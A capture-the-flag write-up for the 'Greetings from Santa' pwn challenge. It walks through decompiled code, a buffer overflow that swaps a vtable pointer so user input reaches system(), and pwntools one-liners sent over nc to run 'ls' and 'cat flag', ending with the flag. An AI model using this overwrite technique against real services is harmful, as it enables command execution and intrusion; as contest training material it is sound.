# Greetings from Santa
Pwn

## Challenge 

	chall

	Server: nc 199.247.6.180 10003

	Author: littlewho

## Solution

	$ nc 199.247.6.180 10003
	Greetings from Santa! Wanna talk? hi

Decompile in Hopper... This is the corresponding function

	0804886b         db         0x79  ; DATA XREF=sub_8048640+139
	0804886c         db  0x00 ; '.'

	int sub_8048640() {
	    var_C = 0x804888c;
	    eax = printf("Greetings from Santa! Wanna talk? ");
	    eax = sub_8048760();
	    eax = fgets(&var_4C, 0x200, stdin);
	    if ((var_4C & 0xff) == (*0x804886b & 0xff)) {
	            var_C = 0x804888c;
	            eax = sub_8048703(&var_C);
	            esp = (esp - 0x10) + 0x10;
	            eax = 0x0;
	    }
	    else {
	            eax = 0x1;
	    }
	    esp = var_4 + 0xfffffffc;
	    return eax;
	}

So from the above, we see that after "Wanna talk?" is printed, we need to answer "y" (0x79 in ASCII)
	
	$ nc 199.247.6.180 10003
	Greetings from Santa! Wanna talk? y
	What is your name? ^C

Now, we go into another function asking for name

	int sub_8048703(int arg0) {
	    printf("What is your name? ");
	    fgets(&var_6C, 0x64, *stdin);
	    //*(int8_t *)(ebp + (strlen(&var_6C) - 0x1) + 0xffffff94) = 0x0;
	    var_6C[strlen(&var_6C) - 0x1] = 0x0; // set last byte to null
	    eax = (**arg0)(arg0, &var_6C);
	    return eax;
	}

And that's it...

	$ nc 199.247.6.180 10003
	Greetings from Santa! Wanna talk? y
	What is your name? hi
	Hohoho! Hello, hi!

So I assume the vulnerability is in the inputs.

---

### Understanding the vulnerability

In the decompiled code, we see something interesting

	// Global
	struct vtable_804888c_type g4 = {
    	.e0 = function_804878a
	};
	struct vtable_8048898_type g5 = {
	    .e0 = function_8048772
	};

	// Address range: 0x8048772 - 0x8048789
	// From class:    CommandExecutor
	// Type:          virtual member function
	int32_t function_8048772(char * command) {
	    // 0x8048772
	    return system(command);
	}

	// Address range: 0x804878a - 0x80487a6
	// From class:    Greeter
	// Type:          virtual member function
	int32_t function_804878a(char * a1) {
	    // 0x804878a
	    return printf("Hohoho! Hello, %s!\n", a1);
	}

And then in the running code, we notice that `g4` is passed to `function_8048703` and it is called before returning as `a1`;

	int32_t function_8048636(int32_t a1) {
	    // 0x8048636
	    alarm(60);
	    setvbuf(g6, NULL, 2, 0);
	    setvbuf(g7, NULL, 2, 0);
	    setvbuf((struct _IO_FILE *)g8, NULL, 2, 0);
	    int32_t v1 = (int32_t)&g4; // bp-20
	    printf("Greetings from Santa! Wanna talk? ");
	    function_8048760();
	    int32_t str = 0; // bp-84
	    fgets((char *)&str, 512, g7);
	    int32_t result;
	    if (str % 256 == 121) {
	        // 0x80486e0
	        function_8048703(&v1);
	        result = 0;
	        // branch -> 0x80486fb
	    } else {
	        result = 1;
	    }
	    // 0x80486fb
	    return result;
	}

	// Address range: 0x8048703 - 0x8048760
	int32_t function_8048703(int32_t * a1) {
	    // 0x8048703
	    printf("What is your name? ");
	    int32_t str = 0; // bp-112
	    fgets((char *)&str, 100, g7);
	    *(char *)(strlen((char *)&str) - 109 + g2) = 0;
	    return *(int32_t *)*a1;
	}

So in essence, we need to override `g4` address with `g5`

---

### Form the payload

From RetDec decompiler, we get the address of `g5` as `0x8048898`.

Now, we form the payload, a simple buffer overflow to override the address.

Fuzz for offset size

	$ python -c "from pwn import *; print 'y' + cyclic(300)" | strace ./chall
	--- SIGSEGV {si_signo=SIGSEGV, si_code=SEGV_MAPERR, si_addr=0x61617161} ---
	+++ killed by SIGSEGV +++
	Segmentation fault

	$ pwn cyclic -c 0x61617161
	63


Note, that the param passed to the `system()` function is from the 2nd input. Hence, try out with `ls` command


	$ python -c "from pwn import *; print 'y' + cyclic(63) + p32(0x8048898); print 'ls'"
	| nc 199.247.6.180 10003
	Greetings from Santa! Wanna talk? What is your name? chall
	flag
	redir.sh

### Found flag!

	$ python -c "from pwn import *; print 'y' + cyclic(63) + p32(0x8048898); print 'cat flag'"
	| nc 199.247.6.180 10003
	Greetings from Santa! Wanna talk? What is your name? 
	X-MAS{6r3371n65_fr0m_5y573m_700}

## Flag

	X-MAS{6r3371n65_fr0m_5y573m_700}
